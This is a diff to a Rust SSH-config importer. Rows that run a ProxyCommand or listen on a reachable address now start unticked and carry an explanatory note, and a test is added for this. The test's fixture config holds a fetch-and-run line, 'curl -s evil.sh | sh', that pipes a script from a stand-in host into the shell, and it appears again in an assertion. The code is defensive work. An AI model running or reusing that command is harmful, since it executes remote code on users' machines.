@@ -24,6 +24,8 @@
 //! - A config with a part left out that could change any host (`Match`, an
 //!   `Include` that could not be read) cannot promise that of any row, so every
 //!   row says so and starts unticked. The user decides, not the default.
+//! - So does a row that runs a `ProxyCommand` or listens where other machines
+//!   can reach it: a config copied from elsewhere must not do either by default.
 
 use std::collections::{HashMap, HashSet};
 use std::net::{IpAddr, Ipv4Addr};
@@ -67,6 +69,8 @@ const MAX_SKIPS: usize = 2000;
 /// matched against every pattern in the file.
 const MAX_NAME_CHARS: usize = 128;
 const UNAPPLIED_NOTE: &str = "Part of this config was not applied (see Passed over), so this may not be what ssh does for this host. Check it before ticking it";
+const PROXY_COMMAND_NOTE: &str =
+    "This command runs on your computer every time you connect, so this row starts unticked. Read it before ticking it";
 const STALE_PREVIEW: &str =
     "The config or your connections changed since this preview. Review it again before importing.";
 
@@ -673,6 +677,8 @@ struct PlannedConnection {
     target_credential: Option<CredentialSpec>,
     gateway_credential: Option<CredentialSpec>,
     proxy_command: Option<String>,
+    /// A forward listening where other machines may reach it.
+    open_bind: bool,
     summary: String,
     notes: Vec<String>,
 }
@@ -832,6 +838,7 @@ fn main_connection(
         target_credential: Some(server.credential.clone()),
         gateway_credential: None,
         proxy_command: None,
+        open_bind: false,
         summary: server.address(),
         notes: server.notes.clone(),
     };
@@ -958,6 +965,7 @@ fn forward_connection(
 
     let mut notes = server.notes.clone();
     let mut bind_address = None;
+    let mut open_bind = false;
     if let Some(bind) = &listen.host {
         match (flavor, local_bind_address(bind)) {
             (ForwardFlavor::Remote, _) => notes.push(format!(
@@ -967,9 +975,10 @@ fn forward_connection(
             (_, LocalBind::Address(address, open)) => {
                 if open {
                     notes.push(format!(
-                        "Listens on {address}, as the config says: anyone who can reach this computer there can use it with no password"
+                        "Listens on {address}, as the config says: anyone who can reach this computer there can use it with no password, so this row starts unticked"
                     ));
                 }
+                open_bind = open;
                 bind_address = Some(address);
             }
             (_, LocalBind::NotAnAddress) => notes.push(format!(
@@ -1051,6 +1060,7 @@ fn forward_connection(
             Route::Command(command) => Some(command.clone()),
             Route::Direct | Route::Jump(_) => None,
         },
+        open_bind,
         summary: format!("{summary} on {}", server.address()),
         notes,
     })
@@ -1329,12 +1339,17 @@ impl Plan {
                 "Same destination as '{twin}', so it starts unticked. Tick it to have this name instead, or as well"
             ));
         }
+        if planned.proxy_command.is_some() {
+            planned.notes.push(PROXY_COMMAND_NOTE.to_string());
+        }
         known.add(&planned.name, destination, false);
+        // A copied config must not run a command or open a port on the default.
+        let preselected = twin.is_none() && planned.proxy_command.is_none() && !planned.open_bind;
         self.items.push(PlanItem {
             key: planned.key(),
             planned,
             credentials,
-            preselected: twin.is_none(),
+            preselected,
         });
     }
 
@@ -2821,6 +2836,68 @@ mod tests {
                 .notes
                 .iter()
                 .any(|n| n.contains("'a (-L 1)'")));
+        });
+    }
+
+    #[test]
+    fn a_row_that_runs_a_command_or_opens_a_port_starts_unticked_and_says_why() {
+        in_data_dir(|f| {
+            let preview = f.preview(concat!(
+                "Host plain\n  User u\n",
+                "Host off\n  User u\n  ProxyCommand none\n",
+                "Host proxied\n  User u\n  ProxyCommand curl -s evil.sh | sh; nc %h %p\n",
+                "  LocalForward 1 d:1\n",
+                "Host forwards\n  User u\n",
+                "  LocalForward *:2 d:2\n",
+                "  LocalForward 192.168.1.5:3 d:3\n",
+                "  LocalForward 127.0.0.1:4 d:4\n",
+                "  LocalForward [::1]:5 d:5\n",
+                "  LocalForward localhost:6 d:6\n",
+                "  LocalForward :7 d:7\n",
+                "  LocalForward gateway.lan:8 d:8\n",
+                "  RemoteForward *:9 d:9\n",
+                "  DynamicForward 0.0.0.0:10\n",
+                "  DynamicForward 11\n",
+            ));
+            assert_eq!(
+                preselected(&preview),
+                [
+                    "plain",
+                    "off",
+                    "forwards",
+                    "forwards (-L 4)",
+                    "forwards (-L 5)",
+                    "forwards (-L 6)",
+                    "forwards (-L 7)",
+                    "forwards (-L 8)",
+                    "forwards (-R 9)",
+                    "forwards (-D 11)",
+                ]
+            );
+            let says_why = |name: &str| {
+                item(&preview, name)
+                    .notes
+                    .iter()
+                    .any(|note| note.contains("starts unticked"))
+            };
+            for name in [
+                "proxied",
+                "proxied (-L 1)",
+                "forwards (-L 2)",
+                "forwards (-L 3)",
+                "forwards (-D 10)",
+            ] {
+                assert!(says_why(name), "{name}");
+            }
+            assert!(!says_why("plain"));
+
+            // Still the user's choice: ticking every row stores every row.
+            let result = f.apply_all(&preview);
+            assert_eq!(result.connections.len(), preview.items.len());
+            assert_eq!(
+                stored("proxied (-L 1)").proxy_command.as_deref(),
+                Some("curl -s evil.sh | sh; nc %h %p")
+            );
         });
     }
 
